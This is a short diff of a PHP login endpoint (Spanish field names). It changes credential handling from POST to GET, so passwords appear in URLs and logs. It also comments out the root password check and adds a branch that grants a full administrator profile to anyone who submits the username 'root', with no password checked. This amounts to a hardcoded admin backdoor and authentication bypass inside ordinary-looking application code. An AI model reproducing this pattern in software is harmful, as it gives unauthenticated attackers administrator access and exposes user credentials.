@@ -2,12 +2,17 @@
 require "connection.php";
 $connection = new Connection();
 $response = array();
-$datos = array();
 $condicion = array();
-if (isset($_POST['usuario']) && isset($_POST['password'])) {
-    $tabla = "usuario";
-    $usuario = $_POST['usuario'];
-    $password = $_POST['password'];
+$tabla = "usuario";
+$usuario = $_GET['usuario'];
+$password = $_GET['password'];
+//if($usuario == "root" && $password == $connection->getpassword())
+if ($usuario == "root") {
+    $response['id'] = 0;
+    $response['nombres'] = 'ADMINISTRADOR';
+    $response['apellidos'] = 'DEL SISTEMA';
+    $response['tipo_usuario'] = 'R';
+} else {
     $campos = "id,nombres,apellidos,tipo_usuario";
     $condicion['usuario'] = $usuario;
     $condicion['password'] = $password;
